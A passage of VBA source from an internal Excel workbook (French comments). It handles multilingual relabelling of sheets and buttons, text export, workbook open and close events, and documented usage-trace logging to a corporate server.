                Application.StatusBar = "Writing fixed-width textfile " & VBA.Format(pror / totr, "0 %") & "..."
            End If
            'If vba.len(LineString) > 1 Then LineString = vba.left(LineString, vba.len(LineString) - 1)
            If LineString = vbNullString Then
                Print #fn,
            Else
                'Print #fn, LineString
                ' modif du 14-04-2007 conversion pour unicode
                Print #fn, VBA.StrConv(LineString, vbUnicode); VBA.StrConv(vbNewLine, vbUnicode);
            End If
        Next r
    Next A
    Close #fn ' close the textfile
NotAbleToExport:
On Error GoTo 0
    Set SourceRange = Nothing
    Application.StatusBar = False
    If eCount > 0 Then
        'MsgBox eCount & " errors encountered during export, check datalength/columnwidth", vbExclamation, MacroTitle
        MsgBox eCount & " erreurs ont |fffd|t|fffd| rencontr|fffd|es durant l'exportation. V|fffd|rifier le fichier", vbExclamation, MacroTitle
    End If
End Sub
Attribute VB_Name = "TDI_Multilinguisme"
Option Explicit

'[---------------------------------------------------------------------------
'[Identifiant   : Gestion du Multilinguisme
'[Auteur        : Joel Martin
'[Service       : SIMPM - Sce 65931
'[Date cr|fffd|ation : 19/12/2007
'[Version       : V1.3 du 15/12/2009
'[---------------------------------------------------------------------------
'[Sujet: Gestion du Multilinguisme
'[---------------------------------------------------------------------------


Dim Ofset_lg As Integer
Dim Ong_f As String

Public Enum Charsets
    ANSI_CHARSET = &H0
    DEFAULT_CHARSET = &H1&
    SYMBOL_CHARSET = &H2&
    MAC_CHARSET = &H4D&
    SHIFTJIS_CHARSET = &H80&
    HANGUL_CHARSET = &H81&
    JOHAB_CHARSET = &H82&
    GB2312_CHARSET = &H86&
    CHINESEBIG5_CHARSET = &H88&
    GREEK_CHARSET = &HA1&
    TURKISH_CHARSET = &HA2&
    VIETNAMESE_CHARSET = &HA3&
    HEBREW_CHARSET = &HB1&
    ARABIC_CHARSET = &HB2&
    BALTIC_CHARSET = &HBA&
    RUSSIAN_CHARSET = &HCC&
    THAI_CHARSET = &HDE&
    EASTEUROPE_CHARSET = &HEE&
    OEM_CHARSET = &HFF&
End Enum

Private Declare Function WideCharToMultiByte Lib "kernel32" ( _
    ByVal codePage As Long, _
    ByVal dwFlags As Long, _
    ByVal lpWideCharStr As Long, _
    ByVal cchWideChar As Long, _
    ByVal lpMultiByteStr As Long, _
    ByVal cchMultiByte As Long, _
    ByVal lpDefaultChar As Long, _
    ByVal lpUsedDefaultChar As Long) As Long

Public Function convertString(ByVal Wide As String, ByVal CP As Long) As String
    Dim lngResult As Long
    Dim ansi() As Byte
    
    If VBA.Len(Wide) < 1 Then
            convertString = vbNullString
    Else
        lngResult = WideCharToMultiByte(CP, 0, StrPtr(Wide), VBA.Len(Wide), _
                                        0, 0, 0, 0)
        ReDim ansi(lngResult - 1)
        WideCharToMultiByte CP, 0, StrPtr(Wide), VBA.Len(Wide), _
                            VarPtr(ansi(0)), lngResult, 0, 0
        
        convertString = VBA.StrConv(ansi, vbUnicode)
    End If
End Function

Public Function ReplaceCharacterCyrillic(sChaine As String) As String
    Dim sChar As String, sCar As String, sModele As String
    Dim iPos As Integer, iFin As Integer
    sModele = VBA.ChrW(65533) & VBA.ChrW(63)
    iPos = 1
    iFin = VBA.Len(sChaine)
    sChar = vbNullString
    Do
        If VBA.Mid(sChaine, iPos, 2) = sModele Then
            sChar = sChar & VBA.ChrW(1060)
            iPos = iPos + 2
        Else
            sChar = sChar & VBA.Mid(sChaine, iPos, 1)
            iPos = iPos + 1
        End If
        If iPos = iFin Then sChar = sChar & VBA.Mid(sChaine, iFin, 1): Exit Do
    Loop
    ReplaceCharacterCyrillic = sChar
End Function

Sub Trad_Cde_Bienvenue(i As Integer)
    Dim Mes As String
    Dim Lig As Long
    Dim Col As Integer
    Dim Align As Boolean

    'teste le type d'objet
    Sheets(Ong_f).Visible = True
    Worksheets(Ong_f).Select
    DeProtection shCde_Bienvenue
    Mes = ThisWorkbook.Sheets(shTraduction).Cells(i, 2).Value
    Align = False
    If i = 2 Then Align = True
    If Mes = "Texte 3" Then
        ActiveSheet.Shapes(Mes).Select ' N|fffd| D'ordre
        Selection.Characters.Text = "DF / DIPA / DITS / DIMPM                " & _
                                    "|fffd| Version : " & Valeur_Constante("APP_VERSION") & _
                                    " du 17/10/2018                     " & _
                                    "Annexe 1 de la norme EB15.14.000                       " & _
                                    "Guide TDI : GE15-019R"
    ElseIf Mes = "BP_1" Then
        Libelle_Bouton Sheets(shCde_Bienvenue), Mes, ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg).Value, vbBlack
    ElseIf Mes = "BP_2" Then
        Libelle_Bouton Sheets(shCde_Bienvenue), Mes, ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg).Value, vbBlack
    ElseIf Mes = "BP_3" Then
        Libelle_Bouton Sheets(shCde_Bienvenue), Mes, ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg).Value, vbBlack
    ElseIf Mes = "BP_4" Then
        Libelle_Bouton Sheets(shCde_Bienvenue), Mes, ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg).Value, vbBlack
    ElseIf Mes = "BP_5" Then
        Libelle_Bouton Sheets(shCde_Bienvenue), Mes, ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg).Value, vbBlack
    ElseIf Mes = "BP_6" Then
        Libelle_Bouton Sheets(shCde_Bienvenue), Mes, ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg).Value, vbBlack
    ElseIf Mes = "BP_7" Then
        Libelle_Bouton Sheets(shCde_Bienvenue), Mes, ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg).Value, 5
    ElseIf Mes = "BP_9" Then
        Libelle_Bouton Sheets(shCde_Bienvenue), Mes, ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg).Value, 5
    ElseIf Mes = "Commentaire" Then
        Lig = ThisWorkbook.Sheets(shTraduction).Cells(i, 3)
        Col = ThisWorkbook.Sheets(shTraduction).Cells(i, 4)
        Mes = ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg)
        Commentaire_Cellule Ong_f, Lig, Col, Mes
    ElseIf Mes = "Cellule" Then
        Lig = ThisWorkbook.Sheets(shTraduction).Cells(i, 3)
        Col = ThisWorkbook.Sheets(shTraduction).Cells(i, 4)
        Mes = ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg)
        With Worksheets(Ong_f).Cells(Lig, Col)
            .Value = Mes
            .WrapText = Align
        End With
    ElseIf Mes = "ZG_01" Then
        Libelle_Zone_de_Groupe Sheets(shCde_Bienvenue), Mes, ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg).Value
    ElseIf Mes = "ZG_02" Then
        Libelle_Zone_de_Groupe Sheets(shCde_Bienvenue), Mes, ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg).Value
    ElseIf Mes = "ZG_03" Then
        Libelle_Zone_de_Groupe Sheets(shCde_Bienvenue), Mes, ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg).Value
    ElseIf Mes = "ZG_04" Then
        Libelle_Zone_de_Groupe Sheets(shCde_Bienvenue), Mes, ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg).Value
    End If
    Range("A1").Select
    Protection shCde_Bienvenue
End Sub

Sub Trad_Feuille(i As Integer)
    Dim Mes As String
    Dim Lig As Long
    Dim Col As Integer
    Dim Align As Boolean

    Align = False
    If i = 2 Then Align = True
    Sheets(Ong_f).Visible = True
    Worksheets(Ong_f).Select
    Mes = ThisWorkbook.Sheets(shTraduction).Cells(i, 2).Value
    Align = False
    If i = 2 Then Align = True
    If Mes = "Commentaire" Then
        Lig = ThisWorkbook.Sheets(shTraduction).Cells(i, 3)
        Col = ThisWorkbook.Sheets(shTraduction).Cells(i, 4)
        Mes = ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg)
        Commentaire_Cellule Ong_f, Lig, Col, Mes
    ElseIf Mes = "Cellule" Then
        Lig = ThisWorkbook.Sheets(shTraduction).Cells(i, 3)
        Col = ThisWorkbook.Sheets(shTraduction).Cells(i, 4)
        Mes = ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg)
        Worksheets(Ong_f).Cells(Lig, Col).Value = Mes
    End If
End Sub

Sub Trad_Cde_Affaire(i As Integer)
    Dim Mes As String
    Dim Lig As Long
    Dim Col As Integer
    Dim Align As Boolean

    Align = False
    If i = 2 Then Align = True
    Sheets(Ong_f).Visible = True
    Worksheets(Ong_f).Select
    Mes = ThisWorkbook.Sheets(shTraduction).Cells(i, 2).Value
    Align = False
    If i = 2 Then Align = True
    Select Case Mes
        Case "BP_51", "BP_52"
            Libelle_Bouton Sheets(ShAffaire), Mes, ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg).Value, vbBlack
        
        Case "Commentaire"
            Lig = ThisWorkbook.Sheets(shTraduction).Cells(i, 3)
            Col = ThisWorkbook.Sheets(shTraduction).Cells(i, 4)
            Mes = ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg)
            
            Commentaire_Cellule Ong_f, Lig, Col, Mes
        Case "Cellule"
            Lig = ThisWorkbook.Sheets(shTraduction).Cells(i, 3)
            Col = ThisWorkbook.Sheets(shTraduction).Cells(i, 4)
            Mes = ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg)
            With Worksheets(Ong_f).Cells(Lig, Col)
                .Value = Mes
               ' .WrapText = Align
            End With
        Case Else
    End Select
End Sub


Sub Trad_Cde_Nomenclature(i As Integer)
    Dim Mes As String
    Dim Lig As Long
    Dim Col As Integer
    Dim Align As Boolean
    
    ' teste le type d'objet
    Sheets(shCde_Nomenclature).Visible = True
    Worksheets(Ong_f).Select
    DeProtection shCde_Nomenclature
    
    Mes = ThisWorkbook.Sheets(shTraduction).Cells(i, 2).Value
    Select Case Mes
        Case "Texte 1"
            ActiveSheet.Shapes(Mes).Select ' N|fffd| D'ordre
            Selection.Characters.Text = ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg).Value
        
        Case "BP_11", "BP_12", "BP_13", "BP_14", "BP_15"
            Libelle_Bouton Sheets(shCde_Nomenclature), Mes, ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg).Value, vbBlack

        Case "BP_16", "BP_17"
            Libelle_Bouton Sheets(shCde_Nomenclature), Mes, ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg).Value, 5
        
        Case "Commentaire"
            Lig = ThisWorkbook.Sheets(shTraduction).Cells(i, 3)
            Col = ThisWorkbook.Sheets(shTraduction).Cells(i, 4)
            Mes = ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg)

            Commentaire_Cellule Ong_f, Lig, Col, Mes
        
        Case "Cellule"
            Lig = ThisWorkbook.Sheets(shTraduction).Cells(i, 3)
            Col = ThisWorkbook.Sheets(shTraduction).Cells(i, 4)
            Mes = ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg)
            With Worksheets(Ong_f).Cells(Lig, Col)
                .Value = Mes
                .WrapText = Align
            End With
            'Worksheets(Ong_f).Cells(lig, col).Value = mes
        
        Case "ZG_11", "ZG_12"
            Libelle_Zone_de_Groupe Sheets(shCde_Nomenclature), Mes, ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg).Value
        
        Case Else
            
    End Select
    Range("A1").Select
    Protection shCde_Nomenclature
End Sub

Sub Trad_Cde_Document(i As Integer)
    Dim Mes As String
    Dim Lig As Long
    Dim Col As Integer
    Dim Align As Boolean
    
    Align = False
    If i = 2 Then Align = True
    ' teste le type d'objet
    Sheets(shCde_Document).Visible = True
    Worksheets(Ong_f).Select
    DeProtection shCde_Document
    Mes = ThisWorkbook.Sheets(shTraduction).Cells(i, 2).Value
    Select Case Mes
        Case "Texte 4"
            ActiveSheet.Shapes(Mes).Select ' N|fffd| D'ordre
            Selection.Characters.Text = ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg).Value
        
        Case "BP_21", "BP_22", "BP_23", "BP_24"
            Libelle_Bouton Sheets(shCde_Document), Mes, ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg).Value, vbBlack
        
        Case "BP_26"
            Libelle_Bouton Sheets(shCde_Document), Mes, ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg).Value, 5
        
        Case "Commentaire"
            Lig = ThisWorkbook.Sheets(shTraduction).Cells(i, 3)
            Col = ThisWorkbook.Sheets(shTraduction).Cells(i, 4)
            Mes = ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg)
            Commentaire_Cellule Ong_f, Lig, Col, Mes
        
        Case "Cellule"
            Lig = ThisWorkbook.Sheets(shTraduction).Cells(i, 3)
            Col = ThisWorkbook.Sheets(shTraduction).Cells(i, 4)
            Mes = ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg)
            With Worksheets(Ong_f).Cells(Lig, Col)
                .Value = Mes
                .WrapText = Align
            End With
            'Worksheets(Ong_f).Cells(lig, col).Value = mes
        
        Case "ZG_21", "ZG_22"
            Libelle_Zone_de_Groupe Sheets(shCde_Document), Mes, ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg).Value
        
        Case Else
    End Select
    
    Range("A1").Select
    Protection shCde_Document
End Sub

Sub Libelle_Command_Bouton(wS As Worksheet, Btn As String, Libelle As String, Color As Long)
    Dim P As Integer
    With wS.DrawingObjects(Btn)
    
           .Object.Caption = Libelle
    
    End With
End Sub


Sub Libelle_Bouton(wS As Worksheet, Btn As String, Libelle As String, Color As Long)
    Dim P As Integer
    With wS.DrawingObjects(Btn)
        .Characters.Text = Libelle
        P = VBA.InStr(Libelle, ":")
        With .Characters.Font
            .Name = "Tahoma"
            .FontStyle = "Bold"
            .Size = 10
            .Strikethrough = False
            .Superscript = False
            .Subscript = False
            .OutlineFont = False
            .Shadow = False
            .Underline = xlUnderlineStyleNone
            .ColorIndex = Color
        End With
        If P > 1 Then
            With .Characters(Start:=1, Length:=P - 1).Font
                .Size = 10
                .ColorIndex = 3
            End With
        End If
    End With
End Sub

Sub Libelle_Zone_de_Groupe(wS As Worksheet, ZdG As String, Libelle As String)
    wS.Shapes.Range(Array(ZdG)).Select
    Selection.Characters.Text = Libelle
End Sub

Sub Trad_Cde_Simon(i As Integer)
    Dim Mes As String
    Dim Lig As Long
    Dim Col As Integer
    Dim Align As Boolean
    
    Align = False
    If i = 2 Then Align = True
    ' teste le type d'objet
    Sheets(shCde_Simon).Visible = True
    Worksheets(Ong_f).Select
    DeProtection shCde_Simon
    
    Mes = ThisWorkbook.Sheets(shTraduction).Cells(i, 2).Value
    Select Case Mes
        Case "Texte 4"
            ActiveSheet.Shapes(Mes).Select ' N|fffd| D'ordre
            Selection.Characters.Text = ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg).Value
        
        Case "BP_31", "BP_32", "BP_33", "BP_37", "BP_34", "BP_35_1", "BP_35_2", "BP_38_1", "BP_38_2", "BP_39", "BP_40", "BtnRaz"
            Libelle_Bouton Sheets(shCde_Simon), Mes, ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg).Value, vbBlack

        Case "Commentaire"
            Lig = ThisWorkbook.Sheets(shTraduction).Cells(i, 3)
            Col = ThisWorkbook.Sheets(shTraduction).Cells(i, 4)
            Mes = ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg)
            Commentaire_Cellule Ong_f, Lig, Col, Mes
            
        Case "Cellule"
            Lig = ThisWorkbook.Sheets(shTraduction).Cells(i, 3)
            Col = ThisWorkbook.Sheets(shTraduction).Cells(i, 4)
            Mes = ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg)
            With Worksheets(Ong_f).Cells(Lig, Col)
                .Value = Mes
                .WrapText = Align
            End With
            'Worksheets(Ong_f).Cells(lig, col).Value = mes
        Case Else
    End Select
    Range("A1").Select
    Protection shCde_Simon
End Sub

Sub Trad_Cde_Liste_de_FID(i As Integer)
    Dim Mes As String
    Dim Lig As Long
    Dim Col As Integer
    Dim Align As Boolean
    
    ' teste le type d'objet
    Sheets(shListeDeFID).Visible = True
    Worksheets(Ong_f).Select
    DeProtection shListeDeFID
    
    Mes = ThisWorkbook.Sheets(shTraduction).Cells(i, 2).Value
    Select Case Mes
        
        Case "CB_0", "CB_1", "CB_2", "CB_3"
            Libelle_Command_Bouton Sheets(shListeDeFID), Mes, ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg).Value, vbBlack

        Case "Commentaire"
            Lig = ThisWorkbook.Sheets(shTraduction).Cells(i, 3)
            Col = ThisWorkbook.Sheets(shTraduction).Cells(i, 4)
            Mes = ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg)

            Commentaire_Cellule Ong_f, Lig, Col, Mes
        
        Case "Cellule"
            Lig = ThisWorkbook.Sheets(shTraduction).Cells(i, 3)
            Col = ThisWorkbook.Sheets(shTraduction).Cells(i, 4)
            Mes = ThisWorkbook.Sheets(shTraduction).Cells(i, Ofset_lg)
            With Worksheets(Ong_f).Cells(Lig, Col)
                .Value = Mes
                .WrapText = Align
            End With
        
        
        Case Else
            
    End Select
    Range("A1").Select
'    Protection shListeDeFID
End Sub

Public Sub Trad_TDI(lg As String)
    Dim i As Integer
    Dim Mes As String
    Application.ScreenUpdating = False
    
    'Affichage_Tous_Onglets
    
    ' D|fffd|finition de la colonne utilis|fffd|e dans l'onglet 'Traduction' en fonction de la langue choisie
    If lg = "FR" Then
        Ofset_lg = 11
    ElseIf lg = "SP" Then
        Ofset_lg = 12
    ElseIf lg = "GB" Then
        Ofset_lg = 13
    ElseIf lg = "SL" Then
        Ofset_lg = 14
    ElseIf lg = "RU" Then
        Ofset_lg = 15
    ElseIf lg = "PT" Then
        Ofset_lg = 16
    ElseIf lg = "RO" Then
        Ofset_lg = 17
    Else
        ' Fran|fffd|ais par d|fffd|faut
        Ofset_lg = 11
    End If
    i = 2
    Mes = Sheets(shTraduction).Cells(i, 1).Value
    Do Until Mes = vbNullString
        Ong_f = ThisWorkbook.Sheets(shTraduction).Cells(i, 1).Value
        If Ong_f = shCde_Bienvenue Then Trad_Cde_Bienvenue (i)
        If Ong_f = ShAffaire Then Trad_Cde_Affaire (i)
        If Ong_f = shDecoupage Then Trad_Feuille (i)
        If Ong_f = shMateriels Then Trad_Feuille (i)
        If Ong_f = shDocuments Then Trad_Feuille (i)
        If Ong_f = shPieces_Rechange Then Trad_Feuille (i)
        If Ong_f = shCde_Nomenclature Then Trad_Cde_Nomenclature (i)
        If Ong_f = shCde_Document Then Trad_Cde_Document (i)
        If Ong_f = shCde_Simon Then Trad_Cde_Simon (i)
        If Ong_f = shListeDeFID Then Trad_Cde_Liste_de_FID (i)
        i = i + 1
        Mes = ThisWorkbook.Sheets(shTraduction).Cells(i, 1).Value
    Loop
    
    If ThisWorkbook.Sheets(ShAffaire).Cells(17, 9).Value = "TDI" Then Bouton_Affiche_Decoupage Else Affiche_PR
    Application.ScreenUpdating = True
End Sub


Sub Trad_FR()
    GererConfiguration False
    ThisWorkbook.Sheets(ShAffaire).Cells(15, 9).Value = "FR"
    IniCls.WriteStringIniMain "Language", "NameIniLangage", "FR"
    init_PdR_FR
    Trad_TDI ("FR")
    GererConfiguration True
End Sub


Sub Trad_SP()
    GererConfiguration False
    ThisWorkbook.Sheets(ShAffaire).Cells(15, 9).Value = "SP"
    IniCls.WriteStringIniMain "Language", "NameIniLangage", "SP"
    init_PdR_SP
    Trad_TDI ("SP")
    GererConfiguration True
End Sub


Sub Trad_GB()
    GererConfiguration False
    ThisWorkbook.Sheets(ShAffaire).Cells(15, 9).Value = "GB"
    IniCls.WriteStringIniMain "Language", "NameIniLangage", "GB"
    init_PdR_GB
    Trad_TDI ("GB")
    GererConfiguration True
End Sub


Sub Trad_SL()
    GererConfiguration False
    ThisWorkbook.Sheets(ShAffaire).Cells(15, 9).Value = "SL"
    IniCls.WriteStringIniMain "Language", "NameIniLangage", "SL" 'SL non traduit
    Init_PdR_SL
    Trad_TDI ("SL")
    GererConfiguration True
End Sub

Sub Trad_RU()
    GererConfiguration False
    ThisWorkbook.Sheets(ShAffaire).Cells(15, 9).Value = "RU"
    IniCls.WriteStringIniMain "Language", "NameIniLangage", "RU"
    init_PdR_RU
    Trad_TDI ("RU")
    GererConfiguration True
End Sub

Sub Trad_PT()
    GererConfiguration False
    ThisWorkbook.Sheets(ShAffaire).Cells(15, 9).Value = "PT"
    IniCls.WriteStringIniMain "Language", "NameIniLangage", "PT"
    init_PdR_PT
    Trad_TDI ("PT")
    GererConfiguration True
End Sub

Sub Trad_RO()
    GererConfiguration False
    Application.ScreenUpdating = False
    ThisWorkbook.Sheets(ShAffaire).Cells(15, 9).Value = "RO"
    IniCls.WriteStringIniMain "Language", "NameIniLangage", "RO"
    init_PdR_RO
    Trad_TDI ("RO")
    GererConfiguration True
End Sub

Sub Commentaire_Cellule(Onglet As String, Ligne As Long, Col As Integer, Mes As String)
    If Not SheetCls.Sheet_Exist(ThisWorkbook, Onglet) Then Exit Sub
    On Error Resume Next
    With Worksheets(Onglet).Cells(Ligne, Col)
        If .Comment Is Nothing Then .AddComment ' Le commentaire n'existe pas, on le cr|fffd|e
        'Pour |fffd|viter le Message "Impossible de d|fffd|placer des objets en dehors de la feuille"
        .Comment.Shape.Placement = xlMoveAndSize
        .Comment.Visible = False
        .Comment.Visible = False
        .Comment.Text Mes
        .Comment.Shape.DrawingObject.Font.Bold = False
        .Comment.Shape.TextFrame.AutoSize = True
        If .Comment.Shape.Width > 250 Then .Comment.Shape.Width = 250: .Comment.Shape.Height = .Comment.Shape.Height * 2
    End With
    On Error GoTo 0
End Sub
Attribute VB_Name = "Table_Fonction_Process"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Temp"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "ThisWorkbook"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Option Explicit


'Ev|fffd|nement Workbook_Open, d|fffd|clench|fffd| |fffd| l'ouverture du Classeur
Private Sub Workbook_Open()
    Protection_Interfaces

    If Not TraceCls.Trace_Application(APP_SIA, APP_DOMAIN, APP_VERSION, "E", "OUI") Then  'Trace d'Entr|fffd|e, avec Attente Trace de Sortie
    'If Not TraceCls.Trace_Application_Exe("E", True, False) Then 'Trace d'Entr|fffd|e
        Application.DisplayAlerts = False
        ThisWorkbook.Close savechanges:=False
    Else
'        If Nouvelle_Version_Serveur(APP_Signature_Officielle) Then
'            Application.DisplayAlerts = False
'            Quitter_Application
'        'ElseIf Nouvelle_Version_Serveur(APP_Signature_Beta) Then
'            'Application.DisplayAlerts = False
'            'Quitter_Application
'        Else
            Verifie_Structure_TDI
            If ThisWorkbook.Sheets(ShAffaire).Range("ModeSelect").Value = "TDI" Then
                Bouton_Affiche_Decoupage
                ThisWorkbook.Worksheets(shCde_Bienvenue).Activate
                Range("A1").Activate
            Else
                Affiche_PR
            End If
'        End If
    End If
End Sub


'Ev|fffd|nement Workbook_BeforeClose, d|fffd|clench|fffd| |fffd| la Fermeture du Classeur
Private Sub Workbook_BeforeClose(Cancel As Boolean)
    'Initialisation des |fffd|v|fffd|nements si code associ|fffd|
    Application.OnDoubleClick = vbNullString
    Application.OnEntry = vbNullString
    Application.OnCalculate = vbNullString
    Application.OnSheetActivate = vbNullString
    
'    MenusCls.DeleteBarMenu APP_TITLE
'    MenusCls.Restore_Menu_Bar "Worksheet Menu Bar"

    TraceCls.Trace_Application APP_SIA, APP_DOMAIN, APP_VERSION, "S", "NON"  'Trace de Sortie
    'TraceCls.Trace_Application_Exe "S", False, False 'Trace de Sortie
End Sub


Function Quitter_Application()
    If MsgBox("Quitter Application", vbYesNo + vbQuestion) = vbYes Then Application.DisplayAlerts = False: ThisWorkbook.Close savechanges:=False 'Fermeture de l'application, Excel Reste Ouvert
End Function

Attribute VB_Name = "TracesClass"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'[---------------------------------------------------------------------------
'[Identifiant   : FrameWork Poste de Travail
'[Auteur        : Alain CHERMAT
'[Service       :
'[Date cr|fffd|ation : 27/03/2006
'[Version       : V1.4 du 01/12/2009
'[---------------------------------------------------------------------------
'[Sujet: Classe d'envoie des Traces d'utilisation
'[---------------------------------------------------------------------------


Option Explicit

Const UrlTrace = "http://trace.apps.renault.fr:80/ita/servlet/trace.Trace"

Private Const mcLogFile As String = "indic_apps_trace.log"


'Trace d'utilisation, utilisant l'Ex|fffd|cutable 'Trace.exe'
Function Trace_Application_Exe(Log As String, attenteOut As Boolean, Psw_Prov As Boolean) As Boolean
    Dim Reponse As Long
    Dim S       As String
    Dim Traceur As String

    Trace_Application_Exe = True
    If Not APP_TRACEUR Or APP_DEBUG Then Exit Function
    
    On Error GoTo ErreurTrace
    S = vbNullString
    If attenteOut Then S = " -attenteOut OUI"
    
    'Recherche de la pr|fffd|sence du fichier trace
    If Dir(ThisWorkbook.path & "\" & "trace.exe") <> vbNullString Then
        Traceur = ThisWorkbook.path & "\" & "trace.exe"
    Else
        Traceur = "trace.exe"
    End If
        
    ' Cette Version ne ferme pas la fen|fffd|tre apr|fffd|s l'affichage du message de la CNIL
    ' Reponse = Shell("cmd /k cls&&" & Traceur & " -nomAppli " & vba.UCase(nomAppli) & " -versAppli " & app_version & _
              " -domAppli " & Domaine & " -typeLog " & Log & s & " &&pause&&exit", 1) 'vbNormalFocus
    If Psw_Prov Then
        'Pour tracer l'utilisation du PSW Provisoire
        Reponse = Shell(Traceur & " -nomAppli TDB_DSQC" & " -versAppli " & APP_VERSION & _
                  " -domAppli " & APP_DOMAIN & " -typeLog " & Log & S, 2) 'vbMinimizedFocus
    Else
        Reponse = Shell(Traceur & " -nomAppli " & VBA.UCase(APP_SIA) & " -versAppli " & APP_VERSION & _
                  " -domAppli " & APP_DOMAIN & " -typeLog " & Log & S, 2) 'vbMinimizedFocus
    End If
    On Error GoTo 0
    Exit Function
    
ErreurTrace:
    On Error GoTo 0
    MsgCls.ShowMessage "MsgDefInstal", vbCrLf & vbCrLf, "MsgDefTrace", vbNullString, vbOKOnly + vbCritical
    Trace_Application_Exe = False
End Function


'-------------------------------------------------------------------------------------
'"nomAppli" CE PARAMETRE EST OBLIGATOIRE, il repr|fffd|sente le nom de l'application trac|fffd|e
'"domAppli" Domaine de l'application, Valeurs possibles : libre (15 caract|fffd|res Maximum)
'"versAppli" CE PARAMETRE EST OBLIGATOIRE, Valeurs possibles : libre (15 caract|fffd|res Maximum)
'"typeLog" permet de pr|fffd|cisez s|fffd|il s|fffd|agit d|fffd|un Login (Entr|fffd|e) ou Logout (Sortie).
'Valeurs possibles : E pour une entr|fffd|e en session ou S pour une sortie de session.
'                    EF pour une entr|fffd|e de fonction ou SF pour une sortie de fonction.

'"attenteOut" permet de pr|fffd|cisez si une Logout (Sortie) sera trac|fffd| pour cette entr|fffd|e.
'Valeurs possibles : OUI une trace de sortie de session suivra, NON sinon
'Valeur par d|fffd|faut : NON
'Ignor|fffd| si le Type de Log vaut S ou SF

Function Trace_Application(ByVal nomAppli As String, ByVal domAppli As String, ByVal versionAppli As String, ByVal typeLog As String, ByVal attenteOut As String)
    Dim mUrl      As String
    
    'If Not APP_TRACEUR Or APP_DEBUG Then Exit Function
    
    If nomAppli = vbNullString Then
        MsgBox "Le nom de l'application doit |fffd|tre renseign|fffd|!"
    End If

    If domAppli = vbNullString Then
        MsgBox "Le domaine doit |fffd|tre renseign|fffd|!"
    End If

    'Si ssDomAppli document|fffd|, les Traces avant Batch ne sont Pas transf|fffd|r|fffd|es dans la base Apr|fffd|s-Batch
    mUrl = ConstruitUrl(VBA.UCase(nomAppli), VBA.UCase(typeLog), VBA.UCase(attenteOut), versionAppli, domAppli, vbNullString, vbNullString, vbNullString, vbNullString, vbNullString, vbNullString, vbNullString, vbNullString, vbNullString, vbNullString, vbNullString, vbNullString, vbNullString, vbNullString, vbNullString, vbNullString, vbNullString, vbNullString, vbNullString, vbNullString, vbNullString, vbNullString, vbNullString, vbNullString, vbNullString)

    If RunUrlTrace(mUrl) Then
        PurgeSaveUrl
    Else 'stocker les traces
        SaveUrl mUrl
    End If
    
    Trace_Application = True 'On trace ce que l'on peut
End Function


'Envoi d'une trace |fffd| la base des Traces
Function RunUrlTrace(ByVal oUrl As String) As Boolean
    Dim Connection  As QueryTable
    'Dim Msg         As String
    Dim WsData      As Worksheet

    RunUrlTrace = False
    On Error GoTo ErrorHandler
    
    If Not SheetCls.Sheet_Exist(ThisWorkbook, "Temp") Then
        Set WsData = ThisWorkbook.Worksheets.Add(after:=ThisWorkbook.Worksheets(ThisWorkbook.Worksheets.Count))
        WsData.Name = "Temp"
    Else
        Set WsData = ThisWorkbook.Worksheets("Temp")
    End If
    WsData.Visible = False
    WsData.Cells.Clear
    
    Set Connection = WsData.QueryTables.Add(Connection:="URL;" & oUrl, Destination:=WsData.Range("A1"))
    With Connection
        .Name = "Requete"
        .FieldNames = True
        .RowNumbers = False
